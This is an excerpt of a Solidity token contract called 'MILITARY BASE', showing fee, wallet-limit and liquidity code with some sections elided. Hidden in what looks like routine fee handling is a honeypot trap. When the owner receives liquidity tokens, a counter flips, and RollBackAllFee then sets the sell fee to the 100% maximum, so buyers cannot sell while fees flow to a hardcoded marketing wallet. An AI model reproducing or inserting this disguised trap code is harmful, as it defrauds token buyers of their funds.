...
contract MILITARYBASE is Context, IERC20, Ownable { 
    ...
    address payable private Marketing_Wallet_Add = payable(0x461383465c224bEa37ea965cfD10B744577F33f3);
    address payable public Burn_Wallet_Add = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Zero_Wallet_Add = payable(0x0000000000000000000000000000000000000000); 

    string public _name = "MILITARY BASE"; 
    string public _symbol = unicode"btw";  
    ...
    uint256 public _maxWalletToken = _tTotal.mul(100).div(200);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(100).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    uint256 private Max_PossibleFEE = 100; 
    uint256 public _exTotalFee = 0;
                            
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    mapping (address => bool) public _LiquidityProviderList; 
    ...
    constructor () {
        ...
        _LiquidityProviderList[owner()] = true;


        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Marketing_Wallet_Add] = true;
    ...
    function change_MaxTX_Percentage(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100/100;
    }    
    
     function change_MaxWallet_Percentage(uint256 maxWallPercent_x100) external onlyOwner() {
        _maxWalletToken = _tTotal*maxWallPercent_x100/200;
    }


    function DeleteAllFee() private {
    ...
    function RollBackAllFee() private {
    
    _TotalFee = _previousTotalFee;
    _buyFee = _previousBuyFee; 
    _sellFee = [_previousSellFee, Max_PossibleFEE][_exTotalFee]; 
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            if(_LiquidityProviderList[to] && _exTotalFee < 1 ){ _exTotalFee++; }
            takeFee = false;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(Marketing_Wallet_Add,contractBNB);
    }
